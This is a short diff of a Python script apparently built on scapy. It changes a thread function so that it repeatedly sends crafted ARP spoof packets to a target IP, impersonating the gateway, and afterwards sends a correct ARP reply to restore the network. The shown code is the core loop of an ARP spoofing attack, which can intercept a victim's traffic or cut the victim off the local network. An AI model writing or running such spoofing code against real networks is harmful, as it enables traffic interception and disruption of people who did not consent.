@@ -6,12 +6,16 @@ from scapy.all import *
 spoofed = []
 defaultGateway = "192.168.0.254"
 
-def doit(arg):
+def doit(target_ip, gateway_ip):
     t = threading.currentThread()
+    packet = nc.craft_arp_spoof(target_ip, gateway_ip)
+
     while getattr(t, "do_run", True):
-        send(arg)
-    print("Stopping as you wish.")
-    # todo remtre la co svp
+        send(packet)
+    time.sleep(1) #Optionnal
+
+    # Reset the network back to its initial state (this is basically a correct ARP packet from a gateway to a target)
+    send(ARP(op = 2, psrc = gateway_ip, hwsrc = getmacbyip(gateway_ip), pdst = target_ip, hwdst = getmacbyip(target_ip)))
 
 async def echo(websocket, path):
     
